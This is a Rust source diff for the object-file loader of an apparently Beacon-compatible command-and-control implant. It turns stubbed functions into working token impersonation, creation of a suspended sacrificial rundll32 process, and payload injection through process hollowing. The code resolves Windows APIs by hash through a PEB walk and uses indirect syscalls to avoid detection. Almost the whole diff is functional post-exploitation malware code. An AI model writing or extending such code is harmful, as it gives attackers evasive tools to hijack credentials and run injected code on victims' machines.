@@ -595,14 +595,38 @@ unsafe extern "C" fn beacon_output(_typ: i32, data: *mut u8, len: i32) {
     append_output(slice);
 }
 
-/// `BeaconUseToken(token_handle)` — delegate to token manipulation.
-unsafe extern "C" fn beacon_use_token(_token: *mut c_void) -> i32 {
-    // Token manipulation uses username/password/steal-token, not
-    // raw handles.  Return explicit failure so BOFs don't assume token
-    // impersonation succeeded. Full implementation
-    // would call super::token_manipulation APIs.
-    log::warn!("[coff_loader] BeaconUseToken called — stub, returning failure");
-    -1
+/// `BeaconUseToken(token_handle)` — impersonate the given token.
+///
+/// Resolves `ImpersonateLoggedOnUser` from advapi32 via PEB-walk (no IAT)
+/// and applies the supplied token handle to the current thread.
+unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
+    if token_handle.is_null() {
+        log::warn!("[coff_loader] BeaconUseToken: null token handle");
+        return -1;
+    }
+    // Resolve ImpersonateLoggedOnUser from advapi32 via PEB-walk.
+    let advapi32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) {
+        Some(h) => h,
+        None => {
+            log::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
+            return -1;
+        }
+    };
+    let func_addr = match pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0")) {
+        Some(a) => a,
+        None => {
+            log::warn!("[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser");
+            return -1;
+        }
+    };
+    type FnImpersonateLoggedOnUser = unsafe extern "system" fn(*mut c_void) -> i32;
+    let impersonate: FnImpersonateLoggedOnUser = std::mem::transmute(func_addr);
+    let ok = impersonate(token_handle);
+    if ok == 0 {
+        log::warn!("[coff_loader] BeaconUseToken: ImpersonateLoggedOnUser failed");
+        return -1;
+    }
+    0
 }
 
 /// `BeaconRevertToken()` — delegate to rev2self.
@@ -627,46 +651,206 @@ unsafe extern "C" fn beacon_get_spawn_to(_x86: i32, buffer: *mut u8, length: i32
     std::ptr::copy_nonoverlapping(spawn_to.as_ptr(), buffer, copy_len);
 }
 
+/// Stored sacrificial process info for BeaconInjectTemporaryProcess.
+/// Only one sacrificial process is active at a time per BOF invocation.
+static SACRIFICIAL_PROCESS: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+static SACRIFICIAL_PID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
+
 /// `BeaconSpawnTemporaryProcess(x86, suppressed, handle)` — spawn sacrificial process.
+///
+/// Creates a suspended sacrificial process via `CreateProcessW` resolved from
+/// kernel32 (PEB-walk, no IAT).  The process handle and PID are stored for
+/// later use by `BeaconInjectTemporaryProcess`.
 unsafe extern "C" fn beacon_spawn_temporary_process(
-    _x86: i32,
+    x86: i32,
     _suppressed: i32,
     handle: *mut *mut c_void,
 ) -> i32 {
-    if !handle.is_null() {
-        *handle = std::ptr::null_mut();
+    if handle.is_null() {
+        return -1;
     }
-    log::warn!("[coff_loader] BeaconSpawnTemporaryProcess called — stub, returning failure");
-    -1
+    *handle = std::ptr::null_mut();
+
+    // Resolve CreateProcessW from kernel32 via PEB-walk.
+    let k32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+        Some(h) => h,
+        None => {
+            log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: kernel32 not found");
+            return -1;
+        }
+    };
+    let cpw_addr = match pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0")) {
+        Some(a) => a,
+        None => {
+            log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW not found");
+            return -1;
+        }
+    };
+    type FnCreateProcessW = unsafe extern "system" fn(
+        *const u16,       // lpApplicationName
+        *mut u16,         // lpCommandLine (mutable per Win32)
+        *mut c_void,      // lpProcessAttributes
+        *mut c_void,      // lpThreadAttributes
+        i32,              // bInheritHandles
+        u32,              // dwCreationFlags
+        *mut c_void,      // lpEnvironment
+        *const u16,       // lpCurrentDirectory
+        *mut c_void,      // lpStartupInfo
+        *mut c_void,      // lpProcessInformation
+    ) -> i32;
+    let create_process: FnCreateProcessW = std::mem::transmute(cpw_addr);
+
+    // Choose spawn-to binary path as UTF-16LE with null terminator.
+    // C:\Windows\SysWOW64\rundll32.exe (x86) or C:\Windows\System32\rundll32.exe (x64).
+    const RUNDLL32_X64: &[u16] = &[
+        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101,
+        109, 51, 50, 92, 114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
+    ]; // "C:\Windows\System32\rundll32.exe\0"
+    const RUNDLL32_X86: &[u16] = &[
+        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 87, 79, 87,
+        54, 52, 92, 114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
+    ]; // "C:\Windows\SysWOW64\rundll32.exe\0"
+    let exe: &[u16] = if x86 != 0 { RUNDLL32_X86 } else { RUNDLL32_X64 };
+
+    // STARTUPINFOW = 104 bytes, PROCESS_INFORMATION = 24 bytes.
+    // Both zero-initialised.
+    let mut startup_info = [0u8; 104];
+    let si_cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as u32;
+    startup_info[0..4].copy_from_slice(&si_cb.to_ne_bytes());
+    let mut proc_info = [0u8; 24]; // hProcess(8) + hThread(8) + dwProcessId(4) + dwThreadId(4)
+
+    const CREATE_SUSPENDED: u32 = 0x0000_0004;
+
+    let ok = create_process(
+        exe.as_ptr(),
+        std::ptr::null_mut(),
+        std::ptr::null_mut(),
+        std::ptr::null_mut(),
+        0,
+        CREATE_SUSPENDED,
+        std::ptr::null_mut(),
+        std::ptr::null(),
+        startup_info.as_mut_ptr() as *mut c_void,
+        proc_info.as_mut_ptr() as *mut c_void,
+    );
+
+    if ok == 0 {
+        log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW failed");
+        return -1;
+    }
+
+    // Extract handles from PROCESS_INFORMATION.
+    let h_process = usize::from_ne_bytes(proc_info[0..8].try_into().unwrap_or([0u8; 8])) as *mut c_void;
+    let _h_thread = usize::from_ne_bytes(proc_info[8..16].try_into().unwrap_or([0u8; 8])) as *mut c_void;
+    let pid = u32::from_ne_bytes(proc_info[16..20].try_into().unwrap_or([0u8; 4]));
+
+    // Close the thread handle — we only need the process handle.
+    let _ = crate::syscall!("NtClose", _h_thread as u64);
+
+    // Store for BeaconInjectTemporaryProcess.
+    SACRIFICIAL_PROCESS.store(h_process as u64, Ordering::SeqCst);
+    SACRIFICIAL_PID.store(pid, Ordering::SeqCst);
+
+    *handle = h_process;
+    0
 }
 
 /// `BeaconInjectProcess(hproc, pid, payload, pLen, pOffset)` — inject into process.
+///
+/// Extracts the payload slice `[pOffset..pLen)` and delegates to
+/// `hollowing::inject_into_process(pid, payload)` which handles both PE
+/// and raw shellcode payloads via indirect syscalls.
 unsafe extern "C" fn beacon_inject_process(
     _hproc: *mut c_void,
-    _pid: i32,
-    _payload: *mut u8,
-    _p_len: i32,
-    _p_offset: i32,
+    pid: i32,
+    payload: *mut u8,
+    p_len: i32,
+    p_offset: i32,
 ) -> i32 {
-    log::warn!("[coff_loader] BeaconInjectProcess called — stub, returning failure");
-    -1
+    if payload.is_null() || p_len <= 0 {
+        log::warn!("[coff_loader] BeaconInjectProcess: null payload or invalid length");
+        return -1;
+    }
+    let offset = if p_offset < 0 { 0 } else { p_offset as usize };
+    let len = p_len as usize;
+    if offset >= len {
+        log::warn!("[coff_loader] BeaconInjectProcess: offset >= length");
+        return -1;
+    }
+    let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
+    match hollowing::inject_into_process(pid as u32, data) {
+        Ok(_) => 0,
+        Err(e) => {
+            log::warn!("[coff_loader] BeaconInjectProcess failed: {e}");
+            -1
+        }
+    }
 }
 
 /// `BeaconInjectTemporaryProcess(hproc, pid, payload, pLen, pOffset)` — inject into temp process.
+///
+/// Uses the sacrificial process created by a prior `BeaconSpawnTemporaryProcess`
+/// call.  The `hproc` / `pid` parameters are typically the values returned by
+/// that call, but we also fall back to the globally stored sacrificial process
+/// if they are null / zero.
 unsafe extern "C" fn beacon_inject_temporary_process(
-    _hproc: *mut c_void,
-    _pid: i32,
-    _payload: *mut u8,
-    _p_len: i32,
-    _p_offset: i32,
+    hproc: *mut c_void,
+    pid: i32,
+    payload: *mut u8,
+    p_len: i32,
+    p_offset: i32,
 ) -> i32 {
-    log::warn!("[coff_loader] BeaconInjectTemporaryProcess called — stub, returning failure");
-    -1
+    if payload.is_null() || p_len <= 0 {
+        log::warn!("[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length");
+        return -1;
+    }
+
+    // Resolve target PID: prefer the explicit arg, fall back to stored sacrificial PID.
+    let target_pid = if pid > 0 {
+        pid as u32
+    } else {
+        let stored = SACRIFICIAL_PID.load(Ordering::SeqCst);
+        if stored == 0 {
+            log::warn!("[coff_loader] BeaconInjectTemporaryProcess: no sacrificial process");
+            return -1;
+        }
+        stored
+    };
+
+    // If hproc is null, use the stored sacrificial handle for NtClose in cleanup.
+    let _ = hproc; // Suppress unused warning — the actual injection goes by PID.
+
+    let offset = if p_offset < 0 { 0 } else { p_offset as usize };
+    let len = p_len as usize;
+    if offset >= len {
+        log::warn!("[coff_loader] BeaconInjectTemporaryProcess: offset >= length");
+        return -1;
+    }
+    let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
+    match hollowing::inject_into_process(target_pid, data) {
+        Ok(_) => 0,
+        Err(e) => {
+            log::warn!("[coff_loader] BeaconInjectTemporaryProcess failed: {e}");
+            -1
+        }
+    }
 }
 
 /// `BeaconCleanupProcess(hproc)` — cleanup process handle.
-unsafe extern "C" fn beacon_cleanup_process(_hproc: *mut c_void) {
-    // No-op stub.
+///
+/// Closes the process handle via `NtClose` (indirect syscall) and clears
+/// the stored sacrificial process state.
+unsafe extern "C" fn beacon_cleanup_process(hproc: *mut c_void) {
+    if !hproc.is_null() {
+        let _ = crate::syscall!("NtClose", hproc as u64);
+    }
+    // Clear stored sacrificial process state.
+    let stored_handle = SACRIFICIAL_PROCESS.swap(0, Ordering::SeqCst);
+    if stored_handle != 0 && stored_handle != hproc as u64 {
+        // Also close the stored handle if it differs from the one the BOF passed.
+        let _ = crate::syscall!("NtClose", stored_handle);
+    }
+    SACRIFICIAL_PID.store(0, Ordering::SeqCst);
 }
 
 /// `toNative(order, value)` — byte-swap if needed.  On x86/x64, native is LE.
